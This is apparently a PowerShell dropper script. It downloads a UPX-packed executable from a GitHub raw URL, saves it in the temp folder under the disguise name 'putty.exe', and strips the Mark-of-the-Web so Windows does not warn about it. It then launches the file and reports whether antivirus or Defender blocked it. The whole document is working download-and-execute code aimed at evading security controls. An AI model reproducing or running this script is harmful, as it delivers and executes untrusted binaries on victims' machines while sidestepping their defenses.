$exeName = "putty.exe"
$exePath = Join-Path $env:TEMP $exeName
$url = "https://github.com/reika911/BOENG/raw/refs/heads/main/sysinfo_upx.exe"

try {
    Write-Host "[*] Downloading..." -ForegroundColor Cyan
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile($url, $exePath)

    if (-not (Test-Path $exePath)) {
        throw "Download failed - file not created"
    }

    $size = (Get-Item $exePath).Length
    Write-Host "[+] Downloaded: $size bytes" -ForegroundColor Green

    Write-Host "[*] Unblocking file..."
    Unblock-File -Path $exePath -ErrorAction SilentlyContinue
    Remove-Item -Path "$exePath:Zone.Identifier" -ErrorAction SilentlyContinue

    Write-Host "[*] Executing: $exePath" -ForegroundColor Cyan
    $proc = Start-Process -FilePath $exePath -PassThru

    Start-Sleep -Seconds 2

    if ($proc.HasExited) {
        Write-Warning "[-] Process exited with code: $($proc.ExitCode)"
        Write-Warning "    Likely blocked by AV/Defender"
    } else {
        Write-Host "[+] Process running (PID: $($proc.Id))" -ForegroundColor Green
    }
} catch {
    Write-Error "[-] Error: $_"
    Write-Error "    Exception: $($_.Exception.Message)"
}
